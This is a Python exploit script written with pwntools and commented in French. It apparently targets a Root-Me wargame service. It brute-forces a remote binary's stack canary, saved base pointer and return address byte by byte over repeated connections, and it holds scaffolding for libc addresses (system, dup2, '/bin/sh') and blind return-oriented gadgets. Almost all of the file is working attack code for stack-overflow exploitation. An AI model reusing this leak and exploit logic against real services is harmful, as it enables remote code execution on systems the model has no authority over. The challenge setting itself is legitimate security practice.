

from pwn import p64, pwnlib, remote
from time import sleep

import print_tools as pt

# import traceback

class LeakedValues():

    def __init__(self):
        super().__init__()

        self.dodo = 0.03

        ##### TODO avec -hv
        self.canary = p64(0x633ff5b6fce38600)
        self.rbp        = p64(0x00007ffc44c70320)
        self.retadr = p64(0x00007f8332301245)


class LibcAdr(LeakedValues):

    def __init__(self):
        super().__init__()
        self.libc_base  = 0x0
        self.dup2       = 0x0
        self.system     = 0x0
        self.binsh      = 0x0
        self.build_id    = ""
        self.no_lib_leak  = False

    def _get_nolibleak(self):
        return(self._nolibleak)
    
    def _set_nolibleak(self, value):
        if value:
            printInfo("[+] No Libc leak will be perfomed")
        self._nolibleak = value
        return(self._nolibleak)
    
    nolibleak=property(_get_nolibleak, _set_nolibleak)

class BinAdr(LibcAdr):

    def __init__(self):
        super().__init__()
        self.stop_gadget = 0x0
        self.brop_gadget = 0x0
        self.leak_adr    = 0x0
        self.bin_base    = 0x0


class ExploitStructure(BinAdr):

    host = 'challenge03.root-me.org'
    port = 56562

    def __init__(self):
        super().__init__()
        self.buffer = b'A'*40
        self.crash  = b'CRSHCRSH'

        self.exploit    = 1
        self.simpleleak = False
        self.hand       = False

    
    def remoteConnect(self):
        try:
            r = remote(self.host, self.port)
            return r
        except pwnlib.exception.PwnlibException:
            pt.printError("Could not connect to remote host.")

    def beginning(self):
        begin = self.buffer + self.canary + self.rbp
        return begin


class ExploitMethods(ExploitStructure):
    def __init__(self):
        super().__init__()

    def _get_values_from_file():
        try:
            with open("values.json", "r") as f:
                return json.load(f)
        except FileNotFoundError:
            pt.printError("values.jsons is missing or is in the wrong directory")
        except json.decoder.JSONDecodeError:
            pt.printError("values.jsons does not contain a valid json object")


    def leak_values(self, buffer):
        try:
            leaked_info	= []

            tabstr	= ['CANARY     ', 'RBP        ', 'RETADR     ']
            indice	= 0

            while len(leaked_info) < 3:

                payload_tmp	= buffer
                for value in leaked_info:
                    payload_tmp += value

                leaked_value = b''
                oa = 0

                # En cas de presence de \x0A dans la valeur leakee
                #leaked_value = b'\x0a\xf2\x45'
                #leaked_value = leaked_value[::-1]
                ##################################################

                while len(leaked_value) < 8:

                    for i in range(256):		# 256 hein

                        r = self.remoteConnect()     # Florian

                        junk		= r.recv()		# "Enter"

                        char		= bytes([i])
                        payload 	= payload_tmp + leaked_value + char


                        if oa == 3:						# Il arrive parfois que l'un des chars soit un 0xA
                            leaked_value += bytes([0xA])		# Si jamais c'est le cas, apres 5 tentatives et 5 rejets
                            r.close()					# le script attribuera 0xA a l'octet en cours de leak
                            oa = 0
                            break

                        if i == 10:		# 10 == 0xA --> soit un saut de ligne, et ici ca fait planter le leak car
                            r.close()	# le service stoppe la lecture et retourne donc un Bye! vu qu'il n'y a
                            continue	# pas de segfault
                             

                        r.send(payload)
                        sleep(self.dodo)

                        resp	= r.recv()
                        num		= len(leaked_info) + 1

                        print(pt.cpur + '[-] Leaked value (#{}) : 0x'.format(num) + char.hex() + (leaked_value[::-1].hex()) + pt.cend, end='\r')

                        ### Propre au binaire attaque (a optimiser)
                        '''
                        if num == 2 or num == 3 and len(leaked_value) == 5:
                            begin	= b'\x00\x00\x7f' 
                            leaked_value	+= begin[::-1]
                            break
                        '''
                        #############################

                        if b'Bye' in resp:
                            leaked_value	+= char
                            r.close()
                            break

                        ##### Court-circuitage du leak en cas de besoin #####
                        #if num == 1:
                        #	leaked_value  = TMP.CANARY
                        #	r.close()
                        #	break
                        #elif num == 2:
                        #	leaked_value = TMP.RBP
                        #	r.close()
                        #	break

                        #leaked_value = b'AAAAAAAA' # a dégager pour exploit ^

                        #####################################################


                        try:
                            r.close()
                        except:
                            pass


                        if(i==255):
                            print(pt.cjau + "[-] i raised to 255..." + pt.cend)
                            oa += 1
                            break

                # virer cette ligne pour ne pas appeler persoPrint dans ce module
                pt.crPrint(tabstr[indice], leaked_value, 0)
                leaked_info.append(leaked_value)

                if len(leaked_info)		== 1:
                    self.canary = leaked_value
                elif len(leaked_info)	== 2:
                    self.rbp = leaked_value
                if len(leaked_info)		== 3:
                    self.retadr = leaked_value

                indice += 1
        except Exception as e:
            pt.printError(f"leak_values : new exception occurs : {e}")
            return False

        return True